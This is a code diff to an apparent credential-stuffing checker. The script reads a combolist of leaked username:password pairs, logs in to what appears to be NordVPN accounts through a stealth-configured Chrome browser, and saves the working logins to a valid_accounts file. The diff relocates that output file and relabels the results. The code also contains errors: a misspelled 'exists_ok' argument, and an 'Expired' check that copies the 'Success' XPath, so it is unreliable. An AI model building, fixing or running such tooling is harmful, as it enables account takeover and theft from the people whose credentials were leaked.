@@ -11,8 +11,18 @@ user = []
 password = []
 if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
     user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
+    save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
+    os.makedirs(save_directory, exists_ok=True)
+    save_file = "\\valid_accounts.txt"
 else:
     user_directory = str(Path(__file__).parent)  + "/nord.txt"
+    save_directory = str(Path(__file__).parent) + "/valid_accounts"
+    os.makedirs(save_directory, exist_ok=True)
+    save_file = "/valid_accounts.txt"
+try:
+    os.remove(save_directory + save_file)
+except FileNotFoundError:
+    pass
 try:
     with open (user_directory, 'r') as combos:
         for i in combos.readlines():
@@ -22,14 +32,11 @@ except FileNotFoundError as e:
     print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
     input()
     exit()
-try:
-    os.remove('nord_accounts.txt')
-except FileNotFoundError:
-    pass
+
 index = 0
 title()
 while index != len(user): 
-    with open(user_directory, 'a') as accounts:
+    with open(save_directory + save_file, 'a') as accounts:
         browser_options = stealthdriver.ChromeOptions()
         browser_options.add_argument(
             'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
@@ -65,9 +72,9 @@ while index != len(user):
             		print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
             if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                 print(" | {}:{} ---> Success!".format(user[index], password[index]))
-                accounts.write(user[index] + ":" + password[index] + "\n")
-            #else:
-               # print(" | {}:{} ---> Expired!".format(user[index], password[index]))
+                accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
+            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
+                print(" | {}:{} ---> Expired!".format(user[index], password[index]))
         else:
             print(" | {}:{} ---> Account not working".format(user[index], password[index]))
         browser.quit()
